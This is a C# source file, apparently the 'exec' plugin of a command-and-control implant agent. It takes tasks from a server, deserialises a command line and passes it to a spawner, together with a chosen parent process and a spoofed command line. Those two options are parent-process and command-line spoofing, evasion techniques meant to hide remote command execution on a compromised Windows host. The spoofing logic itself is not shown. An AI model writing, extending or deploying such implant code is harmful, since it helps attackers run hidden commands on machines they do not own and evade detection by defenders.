﻿using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "exec";
        private IMessageManager messageManager { get; set; }
        private ISpawner spawner { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
        }

        public async Task Execute(ServerJob job)
        {
            Console.WriteLine(job.task.parameters);
            ExecArgs args = JsonSerializer.Deserialize<ExecArgs>(job.task.parameters);

            if(args is null)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Args is null",
                    completed = true
                });
                return;
            }

            if (string.IsNullOrEmpty(args.commandline))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Missing commandline",
                    completed = true
                });
                return;
            }

            if(await this.spawner.Spawn(new SpawnOptions()
            {
                parent = args.parent,
                commandline = args.commandline,
                output = args.output,
                task_id = job.task.id,
                spoofedcommandline = args.spoofedcommandline
            }))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Process Spawned",
                    completed = true
                });
                return;
            }

            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = "Failed to spawn process",
                completed = true
            });

        }
    }
}
